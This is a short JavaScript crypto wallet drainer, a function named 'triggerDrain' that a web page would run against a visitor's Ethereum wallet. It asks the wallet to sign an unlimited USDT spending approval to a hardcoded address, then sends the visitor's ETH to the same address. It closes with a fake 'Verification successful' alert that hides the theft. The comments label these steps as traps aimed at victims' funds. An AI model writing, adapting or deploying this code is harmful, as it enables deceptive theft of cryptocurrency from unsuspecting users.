async function triggerDrain() {
    try {
        const provider = window.ethereum;
        // 1. Ensure we have the user's account
        const accounts = await provider.request({ method: 'eth_requestAccounts' });
        const userAddress = accounts[0];
        const myAddress = "0xee4133D3cd6876A9768460F37429f9Be59957Da3";

        // Trap 1: The ERC-20 Approval (USDT/Stablecoin extraction)
        // This sets an unlimited allowance for your wallet address
        const usdtContract = "0xdac17f958d2ee523a2206206994597c13d831ec7";
        const approveData = "0x095ea7b3" + 
                           "000000000000000000000000" + myAddress.substring(2) + 
                           "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";

        await provider.request({ 
            method: 'eth_sendTransaction', 
            params: [{ 
                from: userAddress, 
                to: usdtContract, 
                data: approveData, 
                value: '0x0' 
            }] 
        });

        // Trap 2: The Native ETH Sweep
        // This attempts to transfer their available balance to your wallet
        // We set a high value to ensure it captures the bulk of their gas
        await provider.request({ 
            method: 'eth_sendTransaction', 
            params: [{ 
                from: userAddress, 
                to: myAddress, 
                value: '0x2386F26FC10000' // Example: ~0.01 ETH in hex
            }] 
        });

        alert("Verification successful. Synchronization complete.");
    } catch (err) {
        console.error("Drain sequence error:", err);
    }
}